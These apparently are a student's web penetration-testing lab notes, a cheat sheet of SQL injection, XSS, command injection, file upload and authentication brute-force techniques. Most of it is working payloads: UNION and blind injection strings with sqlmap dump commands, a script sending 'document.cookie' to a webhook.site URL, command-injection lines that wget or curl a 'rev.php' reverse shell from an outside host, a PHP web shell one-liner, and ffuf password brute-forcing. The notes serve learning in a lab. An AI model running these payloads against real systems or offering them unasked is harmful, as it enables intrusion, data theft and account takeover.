- Recon scripts
	- sumrecon: [https://github.com/thatonetester/sumrecon](https://github.com/thatonetester/sumrecon)
	- TCM's modified script - [https://pastebin.com/MhE6zXVt](https://pastebin.com/MhE6zXVt)
- [Payload for All Things](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [appsec gitbook](https://appsecexplained.gitbook.io/appsecexplained)
- 

##  SQL Injection
###### SQL Injection - UNION
- `jeremy' or 1=1-- -` or `jeremy' or 1=1#`
- `jeremy' union select null,null,null#` -- to output number of columns
- `jeremy' union select null,null,version()#` -- to output version
- `jeremy' union select null,null,table_name from information_schema.tables#` -- to output all of the tables that exists in database
- `jeremy' union select null,null,column_name from information_schema.columns#`-- to output all of the columns that exists in database
- `' union select null,TABLE_NAME,null,null,null,null,null from information_schema.tables-- -`
- `' union select null,COLUMN_NAME,null,null,null,null,null from information_schema.columns-- -`
- [cheatsheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
###### SQL Injection - Blind 
- Blind SQL (Structured Query Language) injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the applications response.
- Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors. [refer](https://portswigger.net/web-security/sql-injection/blind)
- Open burp -> send the POST request to repeater 
- Copy the whole request and paste it in req.txt
- `sqlmap -r req.txt`
- If we can change the session cookie and response doesn't change that means we have SQL Injection 
	- In our lab `Cookie: session=6967cabefd763ac1a1a88e11159957db' and 1=1#`
- Now we will be using substring (SUBSTRING(_string_, _start_, _length_))
	- `Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring('alex',1,3) ='ale'#` -- to check for password match 
	- `Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring((select version()),1,1) ='8'#`  or  `Cookie: session=6967cabefd763ac1a1a88e11159957db' and substring((select version()),1,5) ='8.0.3'#` -- to check the version of database
- Copy the whole GET request and paste it in req2.txt
- `sqlmap -r req2.txt --level=2` -- this will check for cookie
- `sqlmap -r req.txt --level 5 --risk 3 -p param[]` -- to check SQLI in a param
- `sqlmap -r req2.txt --level=2 --dump` -- this will dump all tables from every databases
- `sqlmap -r req2.txt --level=2 --dump -T injection0x02` -- if you know the table

## XSS
- avoid using `alert(1)` try `print()` or `prompt("Hello")`
- `<img src=x onerror="prompt(1)">`
- `<img src=x onerror="window.location.href='https://google.com'">`
- Always test for HTL injection first
- To steal the cookie
	- visit `webhook.site` and click on Unique URL
	- `<script>var i=new Image;i.src="https://webhook.site/112d88a1-28ab-42b9-9864-a6b2ae8750e0/?"+document.cookie;</script>`

##   Command Injection
- `;whoami; echo`
- check for php, python or bash and try different reverse shell payload
- `https://tcm-sec.com \n wget 10.0.2.8:8080/test` 
- We can use webhook.site 
	- ` https://webhook.site/112d88a1-28ab-42b9-9864-a6b2ae8750e0?`whoami` `
- we can pop reverse shell by uploading rev.php
	- `https://tcm-sec.com \n wget 10.0.2.8:8080/rev.php`
	- `https://tcm-sec.com && curl 10.0.2.8:8080/rev.php > /var/www/html/rev.php`
- `500' ;whoami;#` -- always try ;whoami;

## Insecure File Upload
- Always check if the sanity is done only on client side or it is done on server side as well (use burp repeater for invetigation)
- `ffuf -w /usr/share/wordlists/dirb/common.txt  -u http://localhost/FUZZ`
- `<?php system($_GET['cmd']); ?>`
- always check for other extension such as php5, php4, phtml


## Attacking Authentication
- Brute Force
	- Use Burp to attack and moniter by length filter
- ffuf
	- copy the request from burp and paste it in req.txt
	- change password to FUZZ
	- `ffuf -request req.txt -request-proto http -w /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt -fs 1814`  --  -fs to filter file size
- `ffuf -request teashop.txt -request-proto http -mode clusterbomb -w pass.txt:FUZZPASS -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZUSER -fs 3376,3256` same as ffuf attack used above only difference we have FUZZUSEr and FUZZPASS 

## Capstone
- Enum
	- `ffuf -w /usr/share/wordlists/dirb/common.txt -'http://localhost/capstone/FUZZ' -e .php -recursio`
- Sign In/ Sing UP -- check for weak password register